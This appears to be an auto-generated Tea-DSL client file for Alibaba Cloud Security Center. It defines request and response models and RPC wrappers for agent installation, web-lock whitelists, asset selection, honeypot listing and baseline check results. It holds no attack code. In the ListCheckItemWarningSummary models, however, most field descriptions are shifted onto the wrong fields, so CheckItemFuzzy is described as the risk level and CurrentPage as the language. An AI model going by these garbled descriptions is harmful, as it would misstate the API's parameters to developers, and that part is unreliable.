async function installCloudMonitor(request: InstallCloudMonitorRequest): InstallCloudMonitorResponse {
  var runtime = new Util.RuntimeOptions{};
  return installCloudMonitorWithOptions(request, runtime);
}

model InstallPmAgentRequest {
  lang?: string(name='Lang', example='zh'),
  sourceIp?: string(name='SourceIp', example='58.35.xx.xx'),
  type?: string(name='Type', example='aliyun_assist'),
  uuids?: string(name='Uuids', example='inet-a6444920-d303-4ccf-ab87-a1d3cd49****'),
}

model InstallPmAgentResponseBody = {
  requestId?: string(name='RequestId', example='D49B5134-9511-5736-B447-BEE0AC66****'),
}

model InstallPmAgentResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: InstallPmAgentResponseBody(name='body'),
}

async function installPmAgentWithOptions(request: InstallPmAgentRequest, runtime: Util.RuntimeOptions): InstallPmAgentResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'InstallPmAgent',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function installPmAgent(request: InstallPmAgentRequest): InstallPmAgentResponse {
  var runtime = new Util.RuntimeOptions{};
  return installPmAgentWithOptions(request, runtime);
}

model InstallUniBackupAgentRequest {
  policyId?: long(name='PolicyId', description='The ID of the anti-ransomware policy.

> You can call the [DescribeUniBackupPolicies](~~DescribeUniBackupPolicies~~) operation to query the IDs of anti-ransomware policies.', example='123'),
}

model InstallUniBackupAgentResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='53ACA55D-0325-5056-A72D-D0EC0B9C****'),
}

model InstallUniBackupAgentResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: InstallUniBackupAgentResponseBody(name='body'),
}

async function installUniBackupAgentWithOptions(request: InstallUniBackupAgentRequest, runtime: Util.RuntimeOptions): InstallUniBackupAgentResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'InstallUniBackupAgent',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function installUniBackupAgent(request: InstallUniBackupAgentRequest): InstallUniBackupAgentResponse {
  var runtime = new Util.RuntimeOptions{};
  return installUniBackupAgentWithOptions(request, runtime);
}

model JoinWebLockProcessWhiteListRequest {
  processPaths?: [ string ](name='ProcessPaths'),
  uuids?: string(name='Uuids', example='0c1714dc-f7a3-4265-8364-7aa3fce8****,1cc45e7d-7698-4b2c-89d8-e8cba407****'),
}

model JoinWebLockProcessWhiteListResponseBody = {
  requestId?: string(name='RequestId', example='A47D621A-193E-5BDA-ADFA-A0D3133E199C'),
}

model JoinWebLockProcessWhiteListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: JoinWebLockProcessWhiteListResponseBody(name='body'),
}

async function joinWebLockProcessWhiteListWithOptions(request: JoinWebLockProcessWhiteListRequest, runtime: Util.RuntimeOptions): JoinWebLockProcessWhiteListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.processPaths)) {
    query['ProcessPaths'] = request.processPaths;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'JoinWebLockProcessWhiteList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function joinWebLockProcessWhiteList(request: JoinWebLockProcessWhiteListRequest): JoinWebLockProcessWhiteListResponse {
  var runtime = new Util.RuntimeOptions{};
  return joinWebLockProcessWhiteListWithOptions(request, runtime);
}

model ListAssetSelectionSelectedTargetRequest {
  selectionKey?: string(name='SelectionKey', example='2e6ab33d-4e00-4581-ac16-0dd1f9ad****'),
  targetList?: [ string ](name='TargetList'),
}

model ListAssetSelectionSelectedTargetResponseBody = {
  data?: [ 
    {
      targetId?: string(name='TargetId', example='30****'),
      targetName?: string(name='TargetName', example='jen****'),
    }
  ](name='Data'),
  requestId?: string(name='RequestId', example='1EB12F73-6828-59D2-9FBF-F3713FD55128'),
}

model ListAssetSelectionSelectedTargetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListAssetSelectionSelectedTargetResponseBody(name='body'),
}

async function listAssetSelectionSelectedTargetWithOptions(request: ListAssetSelectionSelectedTargetRequest, runtime: Util.RuntimeOptions): ListAssetSelectionSelectedTargetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.selectionKey)) {
    query['SelectionKey'] = request.selectionKey;
  }
  if (!Util.isUnset(request.targetList)) {
    query['TargetList'] = request.targetList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListAssetSelectionSelectedTarget',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listAssetSelectionSelectedTarget(request: ListAssetSelectionSelectedTargetRequest): ListAssetSelectionSelectedTargetResponse {
  var runtime = new Util.RuntimeOptions{};
  return listAssetSelectionSelectedTargetWithOptions(request, runtime);
}

model ListAssetSelectionTargetRequest {
  currentPage?: int32(name='CurrentPage', example='1'),
  pageSize?: int32(name='PageSize', example='20'),
  selectionKey?: string(name='SelectionKey', example='8ccf9b01-2c64-4cba-8122-10115f29****'),
}

model ListAssetSelectionTargetResponseBody = {
  data?: [ 
    {
      targetId?: string(name='TargetId', example='30****'),
      targetName?: string(name='TargetName', example='test****'),
    }
  ](name='Data'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='639'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='50A75355-F58F-5D65-8377-98C88DED9C51'),
}

model ListAssetSelectionTargetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListAssetSelectionTargetResponseBody(name='body'),
}

async function listAssetSelectionTargetWithOptions(request: ListAssetSelectionTargetRequest, runtime: Util.RuntimeOptions): ListAssetSelectionTargetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.selectionKey)) {
    query['SelectionKey'] = request.selectionKey;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListAssetSelectionTarget',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listAssetSelectionTarget(request: ListAssetSelectionTargetRequest): ListAssetSelectionTargetResponse {
  var runtime = new Util.RuntimeOptions{};
  return listAssetSelectionTargetWithOptions(request, runtime);
}

model ListAvailableHoneypotRequest {
  nodeId?: string(name='NodeId', description='The ID of the management node to which the honeypot is deployed.', example='4341018b-8e01-43f6-b1d2-af29a2a4****'),
}

model ListAvailableHoneypotResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  count?: int32(name='Count', description='The number of images that are used for the honeypot.', example='22'),
  data?: [ 
    {
      honeypotImageDisplayName?: string(name='HoneypotImageDisplayName', description='The display name of the image that is used for the honeypot.', example='RuoYi'),
      honeypotImageId?: string(name='HoneypotImageId', description='The ID of the image that is used for the honeypot.', example='sha256:007095d6de9c7a343e9fc1f74a7efc9c5de9d5454789d2fa505a1b3fc62****'),
      honeypotImageName?: string(name='HoneypotImageName', description='The name of the image that is used for the honeypot.', example='ruoyi'),
      honeypotImageType?: string(name='HoneypotImageType', description='The type of the image that is used for the honeypot.', example='Web'),
      honeypotImageVersion?: string(name='HoneypotImageVersion', description='The version of the image that is used for the honeypot.', example='1.0.2'),
      multiports?: string(name='Multiports', description='The port that is supported by the honeypot. The value is in the JSON format. The value contains the following fields:

*   **log_type**: the log type
*   **proto**: the supported protocol
*   **description**: the description
*   **ports**: the supported ports
*   **port_str**: the supported port number of the string type
*   **type**: the type', example='[{"log_type":"web","proto":"tcp","description":"webServerPort","ports":[80.0],"port_str":"80","type":"web"}]'),
      proto?: string(name='Proto', description='The protocol that is supported by the honeypot.', example='tcp'),
      servicePort?: string(name='ServicePort', description='The service port of the honeypot.', example='27017.0'),
      template?: string(name='Template', description='The configuration template of the honeypot.', example='{}'),
    }
  ](name='Data', description='An array consisting of the information about the images that are used for the honeypot.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6C24D883-984D-52FD-BB66-5F89F86E4837'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model ListAvailableHoneypotResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListAvailableHoneypotResponseBody(name='body'),
}

async function listAvailableHoneypotWithOptions(request: ListAvailableHoneypotRequest, runtime: Util.RuntimeOptions): ListAvailableHoneypotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListAvailableHoneypot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listAvailableHoneypot(request: ListAvailableHoneypotRequest): ListAvailableHoneypotResponse {
  var runtime = new Util.RuntimeOptions{};
  return listAvailableHoneypotWithOptions(request, runtime);
}

model ListCheckInstanceResultRequest {
  checkId?: long(name='CheckId', example='23'),
  currentPage?: int32(name='CurrentPage', example='1'),
  instanceIdKey?: string(name='InstanceIdKey', example='i-uf64w4q6p9jti5gl****'),
  instanceIds?: [ string ](name='InstanceIds'),
  instanceNameKey?: string(name='InstanceNameKey', example='i-uf64w4q6p9jti5gl****'),
  lang?: string(name='Lang', example='zh'),
  pageSize?: int32(name='PageSize', example='20'),
  regionIdKey?: string(name='RegionIdKey', example='cn-qingdao'),
  sortTypes?: [ string ](name='SortTypes'),
  statuses?: [ string ](name='Statuses'),
}

model ListCheckInstanceResultResponseBody = {
  basicData?: [ 
    {
      id?: long(name='Id', example='300054'),
      instanceId?: string(name='InstanceId', example='rm-m5es7ch1s62i4****'),
      instanceName?: string(name='InstanceName', example='sg-t4nbk2aodzio52xv****'),
      regionId?: string(name='RegionId', example='ap-southeast-1'),
      status?: string(name='Status', example='NOT_PASS'),
    }
  ](name='BasicData'),
  checks?: [ map[string]any ](name='Checks', example='[{
	"SecurityGroupNameShow": {
		"value": "Sas_Malicious_Ip_Security_Group"
	},
	"InstanceIdShow": {
		"link": "https://ecs.console.aliyun.com/#/securityGroupDetail/region/ap-southeast-1/groupId/sg-t4nbk2aodzio52xvj00s/rule/intranetIngress",
		"value": "sg-t4nbk2aodzio52xv****"
	}
}]'),
  columns?: [ 
    {
      grids?: [ 
        {
          key?: string(name='Key', example='RegionIdShow'),
          showName?: string(name='ShowName', example='Region'),
          type?: string(name='Type', example='text'),
        }
      ](name='Grids'),
      key?: string(name='Key', example='RegionIdShow'),
      search?: boolean(name='Search', example='true'),
      searchKey?: string(name='SearchKey', example='InstanceIdKey'),
      showName?: string(name='ShowName', example='Region'),
      type?: string(name='Type', example='text'),
    }
  ](name='Columns'),
  pageInfo?: {
    count?: string(name='Count', example='20'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='100'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='3AB18264-8A1B-52A6-A9AF-A886556E0F2E'),
}

model ListCheckInstanceResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListCheckInstanceResultResponseBody(name='body'),
}

async function listCheckInstanceResultWithOptions(request: ListCheckInstanceResultRequest, runtime: Util.RuntimeOptions): ListCheckInstanceResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.instanceIdKey)) {
    query['InstanceIdKey'] = request.instanceIdKey;
  }
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  if (!Util.isUnset(request.instanceNameKey)) {
    query['InstanceNameKey'] = request.instanceNameKey;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.regionIdKey)) {
    query['RegionIdKey'] = request.regionIdKey;
  }
  if (!Util.isUnset(request.sortTypes)) {
    query['SortTypes'] = request.sortTypes;
  }
  if (!Util.isUnset(request.statuses)) {
    query['Statuses'] = request.statuses;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListCheckInstanceResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listCheckInstanceResult(request: ListCheckInstanceResultRequest): ListCheckInstanceResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return listCheckInstanceResultWithOptions(request, runtime);
}

model ListCheckItemWarningMachineRequest {
  checkId?: long(name='CheckId', example='8'),
  containerFieldName?: string(name='ContainerFieldName', example='clusterId'),
  containerFieldValue?: string(name='ContainerFieldValue', example='ce89cdd0ea732472a8703821b19e****'),
  currentPage?: int32(name='CurrentPage', example='1'),
  groupId?: long(name='GroupId', example='1161****'),
  lang?: string(name='Lang', example='zh'),
  pageSize?: int32(name='PageSize', example='20'),
  remark?: string(name='Remark', example='225'),
  riskType?: string(name='RiskType', example='cis'),
  status?: int32(name='Status', example='3'),
}

model ListCheckItemWarningMachineResponseBody = {
  list?: [ 
    {
      authVersion?: int32(name='AuthVersion', example='3'),
      bind?: boolean(name='Bind', example='true'),
      containerId?: string(name='ContainerId'),
      containerName?: string(name='ContainerName'),
      fixList?: [ 
        {
          riskId?: long(name='RiskId', example='72'),
          riskName?: string(name='RiskName', example='Alibaba Cloud Linux/Aliyun Linux 2 Baseline for China classified protection of cybersecurity-Level II'),
        }
      ](name='FixList'),
      instanceId?: string(name='InstanceId', example='i-bp1a69mvjujbakxu****'),
      instanceName?: string(name='InstanceName', example='sql-test-0****'),
      internetIp?: string(name='InternetIp', example='8.210.XX.XX'),
      intranetIp?: string(name='IntranetIp', example='172.25.XX.XX'),
      portOpen?: boolean(name='PortOpen', example='true'),
      prompt?: string(name='Prompt', example='There is a weak password (username/password): root/he*****34'),
      regionId?: string(name='RegionId', example='cn-hangzhou'),
      status?: int32(name='Status', example='1'),
      uuid?: string(name='Uuid', example='49e25e0f-bb51-4a5a-a1b3-13a4ddaa****'),
      warningRiskList?: [ 
        {
          riskId?: long(name='RiskId', example='72'),
          riskName?: string(name='RiskName', example='Alibaba Cloud Linux/Aliyun Linux 2 Baseline for China classified protection of cybersecurity-Level II'),
        }
      ](name='WarningRiskList'),
    }
  ](name='List'),
  pageInfo?: {
    count?: int32(name='Count', example='4'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='107'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='22B5615F-700E-575A-A6D5-DC8D7741****'),
}

model ListCheckItemWarningMachineResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListCheckItemWarningMachineResponseBody(name='body'),
}

async function listCheckItemWarningMachineWithOptions(request: ListCheckItemWarningMachineRequest, runtime: Util.RuntimeOptions): ListCheckItemWarningMachineResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.riskType)) {
    query['RiskType'] = request.riskType;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListCheckItemWarningMachine',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listCheckItemWarningMachine(request: ListCheckItemWarningMachineRequest): ListCheckItemWarningMachineResponse {
  var runtime = new Util.RuntimeOptions{};
  return listCheckItemWarningMachineWithOptions(request, runtime);
}

model ListCheckItemWarningSummaryRequest {
  checkItemFuzzy?: string(name='CheckItemFuzzy', description='The risk level. Default value: null, which indicates that check items at all risk levels are queried.Valid values:
*   **high**
*   **medium**
*   **low**', example='password'),
  checkLevel?: string(name='CheckLevel', description='The risk status. Default value: null, which indicates that check items in all states are queried.Valid values:
*   **1**: failed
*   **3**: passed', example='medium'),
  checkType?: string(name='CheckType', description='The type of the baseline.', example='hc.check.type.attack_defense'),
  checkWarningStatus?: int32(name='CheckWarningStatus', description='The type of the check item.', example='3'),
  containerFieldName?: string(name='ContainerFieldName', description='The name of the check item. Fuzzy match is supported.', example='clusterId'),
  containerFieldValue?: string(name='ContainerFieldValue', description='The name of the field that is used to query containers.', example='c471f0f61b9c04f8380556e922cf1****'),
  currentPage?: int32(name='CurrentPage', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='1'),
  groupId?: long(name='GroupId', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='1161****'),
  lang?: string(name='Lang', description='The value of the field that is used to query containers.', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of the page to return. Default value: **1**.', example='20'),
  riskType?: string(name='RiskType', description='Queries the risk statistics of check items by page.', example='weak_password'),
}

model ListCheckItemWarningSummaryResponseBody = {
  list?: [ 
    {
      advice?: string(name='Advice', description='The type of the check item.', example='In the Administrative Tools window, double-click Local Security Policy. In the Local Security Policy window that appears, choose Security Settings\\\\Local Policies\\\\Audit Policy, configure all audit policies as: `Success, Failure`.'),
      alias?: string(name='Alias', description='The type of the baseline.', example='week_pa****'),
      checkId?: long(name='CheckId', description='The alias of the baseline type.', example='696'),
      checkItem?: string(name='CheckItem', description='The ID of the check item.', example='Config the Event Audit policys'),
      checkLevel?: string(name='CheckLevel', description='The description of the check item.', example='high'),
      checkType?: string(name='CheckType', description='The risk level of the check item.Valid values:
*   **high**
*  **medium**
*   **low**', example='Security audit'),
      containerCheckItem?: boolean(name='ContainerCheckItem', example='true'),
      description?: string(name='Description', description='The suggestion on the check item.', example='Config the Event Audit policys'),
      riskType?: string(name='RiskType', description='The risk statistics of the check item.', example='weak_password'),
      status?: int32(name='Status', description='The description of the check item.', example='1'),
      warningMachineCount?: int32(name='WarningMachineCount', description='The risk status of the check item.Valid values:
*  **1**: failed

*  **3**: passed', example='20'),
    }
  ](name='List', description='The data returned.'),
  pageInfo?: {
    count?: int32(name='Count', description='The total number of entries returned.', example='4'),
    currentPage?: int32(name='CurrentPage', description='The pagination information.', example='1'),
    pageSize?: int32(name='PageSize', description='The page number of the returned page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The number of entries returned per page.', example='149'),
  }(name='PageInfo', description='The number of servers that are affected by the check item.'),
  requestId?: string(name='RequestId', description='The number of entries returned on the current page.', example='DC97C9EC-4B7D-5EFF-8A5E-A5CCC9ED****'),
}

model ListCheckItemWarningSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListCheckItemWarningSummaryResponseBody(name='body'),
}

async function listCheckItemWarningSummaryWithOptions(request: ListCheckItemWarningSummaryRequest, runtime: Util.RuntimeOptions): ListCheckItemWarningSummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkItemFuzzy)) {
    query['CheckItemFuzzy'] = request.checkItemFuzzy;
  }
  if (!Util.isUnset(request.checkLevel)) {
    query['CheckLevel'] = request.checkLevel;
  }
  if (!Util.isUnset(request.checkType)) {
    query['CheckType'] = request.checkType;
  }
  if (!Util.isUnset(request.checkWarningStatus)) {
    query['CheckWarningStatus'] = request.checkWarningStatus;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskType)) {
    query['RiskType'] = request.riskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListCheckItemWarningSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listCheckItemWarningSummary(request: ListCheckItemWarningSummaryRequest): ListCheckItemWarningSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return listCheckItemWarningSummaryWithOptions(request, runtime);
}

model ListCheckResultRequest {
  checkKey?: string(name='CheckKey', description='The key that you want to use to search for check items in fuzzy match mode.', example='OSS'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='2'),
  instanceIds?: [ string ](name='InstanceIds', description='The instance IDs of the cloud services that you want to query. Separate multiple IDs with commas (,).'),
  instanceTypes?: [ string ](name='InstanceTypes', description='The asset type of the cloud service. Valid values:

*   **ECS**: Elastic Compute Service (ECS)
*   **SLB**: Server Load Balancer (SLB)
*   **RDS**: ApsaraDB RDS
*   **MONGODB**: ApsaraDB for MongoDB (MongoDB)
*   **KVSTORE**: ApsaraDB for Redis (Redis)
*   **ACR**: Container Registry
*   **CSK**: Container Service for Kubernetes (ACK)
*   **VPC**: Virtual Private Cloud (VPC)
*   **ACTIONTRAIL**: ActionTrail
*   **CDN**: Alibaba Cloud CDN (CDN)
*   **CAS**: Certificate Management Service (formerly SSL Certificates Service)
*   **RDC**: Apsara Devops
*   **RAM**: Resource Access Management (RAM)
*   **DDOS**: Anti-DDoS
*   **WAF**: Web Application Firewall (WAF)
*   **OSS**: Object Storage Service (OSS)
*   **POLARDB**: PolarDB
*   **POSTGRESQL**: ApsaraDB RDS for PostgreSQL
*   **MSE**: Microservices Engine (MSE)
*   **NAS**: Apsara File Storage NAS (NAS)
*   **SDDP**: Sensitive Data Discovery and Protection (SDDP)
*   **EIP**: Elastic IP Address (EIP)'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='50'),
  regionId?: string(name='RegionId', example='cn-hangzhou'),
  requirementIds?: [ long ](name='RequirementIds', description='The IDs of requirement items.'),
  riskLevels?: [ string ](name='RiskLevels', description='The risk levels of check items. Separate multiple risk levels with commas (,). Valid values:

*   **HIGH**
*   **MEDIUM**
*   **LOW**'),
  sortTypes?: [ string ](name='SortTypes', description='The types of the conditions based on which check items are sorted. Valid values:

*   **RISK_LEVEL**: risk level
*   **STATUS**: status'),
  standardIds?: [ long ](name='StandardIds', description='The IDs of standards.'),
  statuses?: [ string ](name='Statuses', description='The status of check items. Separate multiple status with commas (,). Valid values:

*   **PASS**
*   **NOT_PASS**
*   **CHECKING**
*   **NOT_CHECK**
*   **WHITELIST**'),
  types?: [ string ](name='Types'),
  vendors?: [ string ](name='Vendors', description='The cloud service provider. Valid values:

*   **ALIYUN**: Alibaba Cloud'),
}

model ListCheckResultResponseBody = {
  checks?: [ 
    {
      checkId?: long(name='CheckId', description='The ID of the check item.', example='5'),
      checkPolicies?: [ 
        {
          requirementId?: long(name='RequirementId', description='The requirement item ID of the check item.', example='2'),
          requirementShowName?: string(name='RequirementShowName', description='The display name of the requirement item for the check item.', example='Alibaba cloud OSS best security practices'),
          sectionId?: long(name='SectionId', description='The section ID of the check item.', example='3'),
          sectionShowName?: string(name='SectionShowName', description='The section display name of the check item.', example='Log Audit'),
          standardId?: long(name='StandardId', description='The standard ID of the check item.', example='1'),
          standardShowName?: string(name='StandardShowName', description='The standard display name of the check item.', example='Best security practices'),
        }
      ](name='CheckPolicies', description='An array that consists of the check policies.'),
      checkShowName?: string(name='CheckShowName', description='The name of the check item.', example='OSS-PublicReadOpenManifestFileWithoutEncryption'),
      instanceSubType?: string(name='InstanceSubType', description='The asset subtype of the cloud service. Valid values:

*   If the **InstanceType** parameter is set to **ECS**, this parameter supports the following valid values:

    *   **INSTANCE**
    *   **DISK**
    *   **SECURITY_GROUP**

*   If the **InstanceType** parameter is set to **ACR**, this parameter supports the following valid values:

    *   **REPOSITORY_ENTERPRISE**
    *   **REPOSITORY_PERSON**

*   If the **InstanceType** parameter is set to **RAM**, this parameter supports the following valid values:

    *   **ALIAS**
    *   **USER**
    *   **POLICY**
    *   **GROUP**

*   If the **InstanceType** parameter is set to **WAF**, this parameter supports the following valid values:

    *   **DOMAIN**

*   If the **InstanceType** parameter is set to other values, this parameter supports the following valid values:

    *   **INSTANCE**', example='DISK'),
      instanceType?: string(name='InstanceType', description='The asset type of the cloud service. Valid values:

*   **ECS**: ECS
*   **SLB**: SLB
*   **RDS**: ApsaraDB RDS
*   **MONGODB**: MongoDB
*   **KVSTORE**: Redis
*   **ACR**: Container Registry
*   **CSK**: ACK
*   **VPC**: VPC
*   **ACTIONTRAIL**: ActionTrail
*   **CDN**: CDN
*   **CAS**: Certificate Management Service (formerly SSL Certificates Service)
*   **RDC**: Apsara Devops
*   **RAM**: RAM
*   **DDOS**: Anti-DDoS
*   **WAF**: WAF
*   **OSS**: OSS
*   **POLARDB**: PolarDB
*   **POSTGRESQL**: ApsaraDB RDS for PostgreSQL
*   **MSE**: MSE
*   **NAS**: NAS
*   **SDDP**: SDDP
*   **EIP**: EIP', example='ECS'),
      lastCheckTime?: long(name='LastCheckTime', description='The timestamp when the last check was performed. Unit: milliseconds.', example='1657793398000'),
      riskLevel?: string(name='RiskLevel', description='The risk level of the check item. Valid values:

*   **HIGH**
*   **MEDIUM**
*   **LOW**', example='HIGH'),
      status?: string(name='Status', description='The status of the check item. Valid values:

*   **PASS**
*   **NOT_PASS**
*   **CHECKING**
*   **NOT_CHECK**
*   **WHITELIST**', example='PASS'),
      taskId?: string(name='TaskId', description='The ID of the check task.', example='64'),
      trialPermission?: boolean(name='TrialPermission', description='Indicates whether the TRIAL permission is required.', example='true'),
      vendor?: string(name='Vendor', description='The value of the cloud service provider.', example='ALIYUN'),
      vendorShowName?: string(name='VendorShowName', description='The name of the cloud service provider.', example='Aliyun'),
    }
  ](name='Checks', description='An array that consists of the check items.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
